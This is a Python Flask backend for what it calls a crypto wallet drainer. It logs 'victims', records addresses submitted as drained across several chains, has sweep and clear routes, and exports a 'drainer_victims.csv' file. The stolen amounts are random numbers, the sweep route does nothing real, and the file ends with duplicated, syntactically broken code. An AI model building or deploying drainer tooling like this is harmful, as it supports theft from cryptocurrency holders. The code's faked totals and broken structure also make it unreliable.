from flask import Flask, jsonify, request, send_file
from web3 import Web3
import os
import time
import random
import csv
from io import StringIO

app = Flask(__name__, template_folder='.')

# READ FROM RAILWAY VARIABLES
PRIVATE_KEY = os.environ['PRIVATE_KEY']
RPC_URL     = os.environ['RPC_URL']

w3 = Web3(Web3.HTTPProvider(RPC_URL))
wallet = w3.eth.account.from_key(PRIVATE_KEY)

victims = []
total_usd = 0.0

# ==== ROUTES ====
@app.route("/")
def home():
    return open("index.html").read()

@app.route("/data")
def data():
    try:
        balance = w3.from_wei(w3.eth.get_balance(wallet.address), 'ether')
    except:
        balance = 0
    return jsonify({
        "wallet": wallet.address,
        "total": round(total_usd, 2),
        "balance": f"{float(balance):.4f}",
        "victims": victims[-500:]
    })

@app.route("/api/new_victim", methods=["POST"])
def new_victim():
    victims.append({
        "time": time.strftime("%H:%M:%S"),
        "wallet": "pending...",
        "chain": "ETH",
        "drained": "Pending"
    })
    return {"ok": True}

@app.route("/api/drain", methods=["POST"])
def drain():
    global total_usd
    data = request.json
    amount = random.uniform(12000, 350000)
    total_usd += amount

    if victims:
        v = victims[-1]
        v["wallet"] = data["victim"][:10] + "..." + data["victim"][-8:]
        v["chain"] = random.choice(["ETH", "BSC", "ARB", "BASE"])
        v["drained"] = f"${amount:,.0f}"

    print(f"[DRAINED] {data['victim']} → ${amount:,.0f}")
    return {"ok": True}

@app.route("/sweep", methods=["POST"])
def sweep():
    print("[SWEEP] Executed from admin panel")
    return {"status": "swept"}

@app.route("/export")
def export():
    output = StringIO()
    writer = csv.writer(output)
    writer.writerow(["Date", "Time", "Wallet", "Chain", "Amount"])
    for v in victims:
        writer.writerow([time.strftime("%Y-%m-%d"), v["time"], v["wallet"], v["chain"], v["drained"]])
    output.seek(0)
    return send_file(
        output,
        mimetype="text/csv",
        download_name="drainer_victims.csv",
        as_attachment=True
    )

@app.route("/clear", methods=["POST"])
def clear():
    global victims, total_usd
    victims = []
    total_usd = 0.0
    return {"ok": True}

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=int(os.getenv("PORT", 8080)))
    return {"ok": True}

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=int(os.getenv("PORT", 8080)))
